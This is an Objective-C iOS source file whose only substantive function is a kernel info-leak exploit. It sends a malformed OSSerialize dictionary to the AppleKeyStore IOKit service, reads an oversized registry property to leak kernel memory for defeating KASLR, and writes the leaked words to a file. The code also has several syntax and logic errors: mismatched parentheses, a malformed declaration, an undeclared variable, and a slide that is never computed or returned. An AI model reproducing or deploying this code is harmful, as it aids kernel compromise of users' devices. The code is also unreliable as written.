//
//  ViewController.m
//  Funn
//
//  Created by Hanyu Liu on 3/14/19.
//  Copyright © 2019 Hanyu Liu. All rights reserved.
//

#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

 enum {
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
};

- (void)viewDidLoad {
    // Do any additional setup after loading the view, typically from a nib.
    }
    
    
unsigned int get_kernel_slide(){
    
    unsigned int kslide = 0;
    unsigned int fixedAddr = 0;
    
   
    uint32_t dict[] = {
        0x000000d3,
        kOSSerializeEndCollection | kOSSerializeDictionary | 2,
        kOSSerializeSymbol | 4,
        0x00414141,
        kOSSerializeEndCollection | kOSSerializeNumber | 0x200,
        0x41414141,
        0x41414141
        
        };
    
    size_t idx = sizeof(dict);
    
    io_service_t serv = 0;
    io_connect_t conn = 0;
    io_iterator_t iter = 0;
    
    mach_port_t master = MACH_PORT_NULL, res = MACH_PORT_NULL;
    
    kern_return_t kr = 0, err = 0;
    
    //get iokit masker port
    
    host_get_io_master(mach_host_self(), &master);
    
    //check if malicious dict is vslid
    
    kr = io_service_get_matching_services_bin(master,(char*))dict,idx,&res);
    
    if (kr == KERN_SUCCESS) {
        }else {
        return -1;
        }
    
    serv = IOServiceGetMatchingService(master, IOServiceMatching("AppleKeyStore"));
    
    //create our user client
    
    kr = io_service_open_extended(serv, mach_task_self(), 0,NDR_record,(io_buf_ptr_t)dict,idx,&err, &conn);
    
    //check if user client was success
    
    if(kr == KERN_SUCCESS){
        
        //client created successfully
    }else {
        
        return -1;
    }
    
    IORegistryEntryCreateIterator(serv, "IOService",kIORegistryIterateRecursively, &iter);
    
    io_object_t object = 0;
    
    uint32_t bytes 0;
    char buf[0x200] = {0};
    
    
    while (bytes == 0){
        
        if(object){
            
            IOObjectRelease(object);
            
        }
        object = IOIteratorNext(iter);
        mach_msg_type_number_t bufCount = 0x200;
        
        //read the 'AAA' property (which containtes the large number)
        
        kr = io_registry_entry_get_property_bytes(object,(char*)"AAA",(char*)*buf,&bufCnt);
        
        bytes = *(uint32_t*)(buf);
        
        
    }
    
    //leaked data has been read
    
    //useful when developing
    
    FILE *f = fopen("/var/mobile/bytes.txt","w");
    for (int a = 0; a < 128; a += 4){
        
        fprintf(f, "%#x\n", *(uint32_t*)(buf + a));
        
    }
    
    fclose(f);
    
}


@end
